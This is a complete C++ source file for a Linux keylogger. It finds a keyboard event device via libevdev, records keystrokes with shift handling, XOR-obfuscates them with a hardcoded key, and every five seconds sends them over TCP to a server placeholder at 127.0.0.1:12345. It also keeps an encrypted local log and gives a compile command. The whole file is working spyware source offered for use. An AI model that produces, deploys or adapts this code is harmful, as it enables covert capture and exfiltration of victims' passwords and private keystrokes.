#include <libevdev-1.0/libevdev/libevdev.h>
#include <iostream>
#include <fstream>
#include <string>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <cstring>
#include <cctype>
#include <csignal>
#include <stdexcept>
#include <unordered_map>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctime> // Added for time_t

class KeyLogger {
private:
    struct libevdev* dev = nullptr;
    int fd = -1;
    std::ofstream logFile;
    const std::string filename;
    bool shiftActive = false;
    std::string buffer;
    const std::string xorKey = "secret";

    struct KeyMapping {
        char base;
        char shifted;
    };
    static const std::unordered_map<int, KeyMapping> keyMap;

    std::string getKeyName(int code) const {
        auto it = keyMap.find(code);
        if (it != keyMap.end()) {
            return std::string(1, shiftActive ? it->second.shifted : it->second.base);
        }
        const char* name = libevdev_event_code_get_name(EV_KEY, code);
        return name ? std::string("[") + name + "]" : "[UNK:" + std::to_string(code) + "]";
    }

    void logKey(int code) {
        buffer += getKeyName(code);
    }

    std::string encrypt(const std::string& data) const {
        std::string result = data;
        for (size_t i = 0; i < data.size(); ++i) {
            result[i] ^= xorKey[i % xorKey.size()];
        }
        return result;
    }

    void sendToServer() {
        if (buffer.empty()) return;

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            std::cerr << "Socket creation failed: " << strerror(errno) << std::endl;
            return;
        }

        struct sockaddr_in serverAddr;
        memset(&serverAddr, 0, sizeof(serverAddr));
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(12345);
        serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");

        if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
            std::cerr << "Connection failed: " << strerror(errno) << std::endl;
            close(sock);
            return;
        }

        std::string encrypted = encrypt(buffer);
        ssize_t sent = send(sock, encrypted.c_str(), encrypted.size(), 0);
        if (sent < 0) {
            std::cerr << "Send failed: " << strerror(errno) << std::endl;
            close(sock);
            return;
        }
        if (sent == static_cast<ssize_t>(encrypted.size())) {
            logFile << encrypted;
            logFile.flush();
            buffer.clear();
        }
        close(sock);
    }

    bool initializeDevice(const std::string& devicePath = "") {
        std::string path = devicePath.empty() ? findDefaultDevice() : devicePath;
        if (path.empty()) return false;

        fd = open(path.c_str(), O_RDONLY | O_NONBLOCK);
        if (fd < 0) {
            throw std::runtime_error("Failed to open device " + path + ": " + std::string(strerror(errno)));
        }

        int rc = libevdev_new_from_fd(fd, &dev);
        if (rc < 0) {
            close(fd);
            throw std::runtime_error("Failed to initialize libevdev: " + std::string(strerror(-rc)));
        }

        if (!libevdev_has_event_type(dev, EV_KEY)) {
            libevdev_free(dev);
            close(fd);
            return false;
        }

        std::cout << "Using device: " << libevdev_get_name(dev) << " at " << path << std::endl;
        return true;
    }

    std::string findDefaultDevice() const {
        for (int i = 0; i < 32; i++) {
            std::string path = "/dev/input/event" + std::to_string(i);
            int tempFd = open(path.c_str(), O_RDONLY | O_NONBLOCK);
            if (tempFd < 0) continue;

            struct libevdev* tempDev = nullptr;
            int rc = libevdev_new_from_fd(tempFd, &tempDev);
            if (rc < 0) {
                close(tempFd);
                continue;
            }

            if (libevdev_has_event_type(tempDev, EV_KEY) &&
                libevdev_get_name(tempDev) &&
                std::string(libevdev_get_name(tempDev)).find("keyboard") != std::string::npos) {
                libevdev_free(tempDev);
                close(tempFd);
                return path;
            }
            libevdev_free(tempDev);
            close(tempFd);
        }
        return "";
    }

public:
    KeyLogger(const std::string& fname = "keylog.txt", const std::string& devicePath = "")
        : filename(fname) {
        logFile.open(filename, std::ios::app);
        if (!logFile.is_open()) {
            throw std::runtime_error("Failed to open log file: " + filename);
        }
        if (!initializeDevice(devicePath)) {
            logFile.close();
            throw std::runtime_error("No suitable keyboard device found.");
        }
    }

    ~KeyLogger() {
        if (!buffer.empty()) {
            sendToServer();
            if (!buffer.empty()) { // If send failed, save locally
                logFile << encrypt(buffer);
                logFile.flush();
            }
        }
        if (logFile.is_open()) logFile.close();
        if (dev) libevdev_free(dev);
        if (fd != -1) close(fd);
    }

    void start() {
        std::signal(SIGINT, signalHandler);
        std::cout << "Keylogger started. Press ESC or Ctrl+C to stop." << std::endl;

        struct input_event ev;
        time_t lastSend = time(nullptr);
        while (running) {
            int rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_NORMAL, &ev);
            if (rc == 0) {
                if (ev.type == EV_KEY) {
                    if (ev.code == KEY_ESC && ev.value == 1) break;
                    if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                        shiftActive = (ev.value == 1);
                        continue;
                    }
                    if (ev.value == 1) {
                        logKey(ev.code);
                    }
                }
            } else if (rc == -EAGAIN) {
                usleep(10000);
            } else {
                std::cerr << "Error reading events: " << strerror(-rc) << std::endl;
                break;
            }

            time_t now = time(nullptr);
            if (difftime(now, lastSend) >= 5) {
                sendToServer();
                lastSend = now;
            }
        }
        std::cout << "\nKeylogger stopped." << std::endl;
    }

private:
    static volatile sig_atomic_t running;
    static void signalHandler(int) { running = 0; }
};

volatile sig_atomic_t KeyLogger::running = 1;
const std::unordered_map<int, KeyLogger::KeyMapping> KeyLogger::keyMap = {
    {KEY_Q, {'q', 'Q'}}, {KEY_W, {'w', 'W'}}, {KEY_E, {'e', 'E'}}, {KEY_R, {'r', 'R'}},
    {KEY_T, {'t', 'T'}}, {KEY_Y, {'y', 'Y'}}, {KEY_U, {'u', 'U'}}, {KEY_I, {'i', 'I'}},
    {KEY_O, {'o', 'O'}}, {KEY_P, {'p', 'P'}}, {KEY_A, {'a', 'A'}}, {KEY_S, {'s', 'S'}},
    {KEY_D, {'d', 'D'}}, {KEY_F, {'f', 'F'}}, {KEY_G, {'g', 'G'}}, {KEY_H, {'h', 'H'}},
    {KEY_J, {'j', 'J'}}, {KEY_K, {'k', 'K'}}, {KEY_L, {'l', 'L'}}, {KEY_Z, {'z', 'Z'}},
    {KEY_X, {'x', 'X'}}, {KEY_C, {'c', 'C'}}, {KEY_V, {'v', 'V'}}, {KEY_B, {'b', 'B'}},
    {KEY_N, {'n', 'N'}}, {KEY_M, {'m', 'M'}}, {KEY_1, {'1', '!'}}, {KEY_2, {'2', '@'}},
    {KEY_3, {'3', '#'}}, {KEY_4, {'4', '$'}}, {KEY_5, {'5', '%'}}, {KEY_6, {'6', '^'}},
    {KEY_7, {'7', '&'}}, {KEY_8, {'8', '*'}}, {KEY_9, {'9', '('}}, {KEY_0, {'0', ')'}},
    {KEY_SPACE, {' ', ' '}}, {KEY_ENTER, {'\n', '\n'}}, {KEY_TAB, {'\t', '\t'}},
    {KEY_BACKSPACE, {'\b', '\b'}}, {KEY_MINUS, {'-', '_'}}, {KEY_EQUAL, {'=', '+'}},
    {KEY_LEFTBRACE, {'[', '{'}}, {KEY_RIGHTBRACE, {']', '}'}}, {KEY_SEMICOLON, {';', ':'}},
    {KEY_APOSTROPHE, {'\'', '"'}}, {KEY_GRAVE, {'`', '~'}}, {KEY_BACKSLASH, {'\\', '|'}},
    {KEY_COMMA, {',', '<'}}, {KEY_DOT, {'.', '>'}}, {KEY_SLASH, {'/', '?'}}
};

int main(int argc, char* argv[]) {
    try {
        std::string devicePath = (argc > 1) ? argv[1] : "";
        KeyLogger logger("keylog.txt", devicePath);
        logger.start();
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    return 0;
}

// compile: g++ -o keylogger keylogger.cpp -levdev
